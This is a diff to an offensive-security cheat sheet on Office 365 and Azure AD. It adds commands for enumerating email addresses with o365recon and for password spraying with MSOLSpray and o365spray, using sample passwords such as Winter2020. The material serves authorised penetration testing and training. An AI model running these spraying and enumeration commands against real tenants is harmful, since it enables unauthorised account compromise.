@@ -32,7 +32,7 @@
     ```
 
 
-### Enumerate Email
+### Enumerate Emails
 
 > By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.
 
@@ -45,20 +45,28 @@
     contact@<TENANT NAME>.onmicrosoft.com - INVALID
     ```
 * Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon
+    ```powershell
+    Install-Module MSOnline
+    Install-Module AzureAD
+    .\o365recon.ps1 -azure
+    ```
 
 
 ### Password Spraying
 
 The default lockout policy tolerates 10 failed attempts, then lock out an account for 60 seconds.
 
-```powershell
-PS> git clone https://github.com/dafthack/MSOLSpray
-PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
-PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
-PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
-PS> Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
-```
-
+* [dafthack/MSOLSpray](https://github.com/dafthack/MSOLSpray)
+    ```powershell
+    PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
+    PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
+    PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
+    PS> Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme!
+    ```
+* [0xZDH/o365spray](https://github.com/0xZDH/o365spray)
+    ```powershell
+    o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
+    ```
 
 ## Azure Services Enumeration
 
@@ -177,5 +185,6 @@ Invoke-MFASweep -Username targetuser@targetdomain.com -Password Winter2020 -Reco
 
 ## References
 
-* [Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD](https://o365blog.com/post/mdm/)
+* [Bypassing conditional access by faking device compliance - @DrAzureAD - September 06, 2020](https://o365blog.com/post/mdm/)
 * [CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course](https://github.com/0xJs/CARTP-cheatsheet/blob/main/Authenticated-enumeration.md)
+* [Attacking Azure/Azure AD and introducing Powerzure - SpecterOps - Ryan Hausknecht - Jan 28, 2020](https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a)
